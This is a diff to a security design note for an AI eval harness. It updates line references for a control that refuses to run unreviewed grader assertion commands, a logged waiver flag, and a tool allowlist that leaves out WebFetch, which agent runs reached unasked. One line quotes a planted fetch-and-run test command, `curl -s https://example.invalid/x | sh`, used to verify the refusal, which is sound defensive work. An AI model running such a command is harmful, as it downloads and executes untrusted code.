@@ -180,8 +180,8 @@ is not a hypothetical: the whole reason to run an eval on a contributor branch i
 the contribution works.
 
 **Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:923` runs before
-anything is graded, called from `cmd_tasks` (`:1860`), `cmd_agent_tasks` (`:1913`),
-`cmd_instructions_tasks` (`:1961`) and `cmd_regrade` (`:2182`), which are the only four subcommands
+anything is graded, called from `cmd_tasks` (`:1862`), `cmd_agent_tasks` (`:1915`),
+`cmd_instructions_tasks` (`:1963`) and `cmd_regrade` (`:2183`), which are the only four subcommands
 that execute an assertion command.
 Four decisions in it are worth stating, because each one is a place the control could have been
 weaker:
@@ -201,7 +201,7 @@ weaker:
 
 Verified by planting `curl -s https://example.invalid/x | sh` into a suite's `assertions.json`:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
-`--graders-reviewed` (`:2896`) is the waiver, and taking it is logged to stdout rather than
+`--graders-reviewed` (`:2897`) is the waiver, and taking it is logged to stdout rather than
 passing silently.
 
 **What it does not buy.** A reviewed command runs with exactly the reach it had before. This
@@ -236,7 +236,7 @@ measurement. The permission mode cannot be the control for a task run. The tool 
 is what shipped: `TASK_TOOLS` at `run_eval.py:122` allows Bash, the file tools and `Skill`, and
 `RunPermissions` at `:421` carries the tool list and the mode together so that widening the surface
 and suppressing prompts are two decisions rather than one `if/else` (`:481`-`:486`). `--all-tools`
-(`:1892`, `:2918`) restores the audited command line. The allowlist is derived from what the
+(`:1894`, `:2919`) restores the audited command line. The allowlist is derived from what the
 committed transcripts show tasks actually use, and it excludes what they show runs reaching but no
 task asks for: `WebFetch` thirty times on the 2026-07-28 `github-actions-security` stamp, plus one
 `ToolSearch` and one `ScheduleWakeup`. Two caveats. Those three `github-actions-security` tasks
